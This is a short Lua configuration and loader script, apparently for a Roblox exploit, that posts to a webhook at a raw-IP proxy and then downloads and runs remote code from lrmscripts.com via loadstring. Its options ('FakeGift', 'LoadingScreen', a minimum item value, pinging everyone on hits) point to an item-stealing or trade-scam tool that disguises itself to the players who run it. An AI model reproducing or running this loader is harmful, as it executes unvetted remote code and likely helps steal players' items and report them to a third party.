_G.LRMConfig = {
    User = {},
    min_value = 10000000000,
    pingEveryone = "Yes", -- dont change this
    Webhook = "http://45.13.225.83:6969/proxy/82512ca1e16f06f729faa0a6f46a0f5c",
    FakeGift = "Yes",
    Trash = "http://45.13.225.83:6969/proxy/82512ca1e16f06f729faa0a6f46a0f5c",
    LoadingScreen = "Yes",
    GiftOnlyRares = "No",
    ExecuteOtherScript = "No",
}
    
loadstring(game:HttpGetAsync('https://lrmscripts.com/script/main.lua'))()